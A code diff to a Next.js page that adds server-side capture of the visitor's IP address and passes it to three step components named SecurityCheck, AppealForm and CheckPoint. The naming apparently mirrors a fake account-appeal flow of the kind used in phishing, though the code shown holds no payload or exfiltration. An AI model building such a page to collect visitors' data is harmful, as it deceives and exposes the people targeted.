@@ -1,12 +1,11 @@
 import Head from 'next/head';
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import styles from '../styles/Home.module.css';
 import SecurityCheck from './security-check';
 import AppealForm from './appeal-form';
 import CheckPoint from './check-point';
 
-
-export default function Home() {
+export default function Home(ip) {
 
   const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false});
 
@@ -26,15 +25,15 @@ export default function Home() {
       </Head>
 
       { steps.step_one && (
-        <SecurityCheck onSubmit={getData} />
+        <SecurityCheck onSubmit={getData}/>
       )}
 
       { steps.step_two && (
-        <AppealForm onSubmit={getData} />
+        <AppealForm onSubmit={getData} ip={ip} />
       )}
 
       { steps.step_three && (
-        <CheckPoint />
+        <CheckPoint ip={ip} />
       )}
 
       <style jsx global>{`
@@ -50,4 +49,12 @@ export default function Home() {
     
   )
   
+}
+
+Home.getInitialProps = async ({ req }) => {
+  let userIP
+  if (req) {
+    userIP = req.headers['x-real-ip'] || req.connection.remoteAddress
+  }
+  return { userIP }
 }
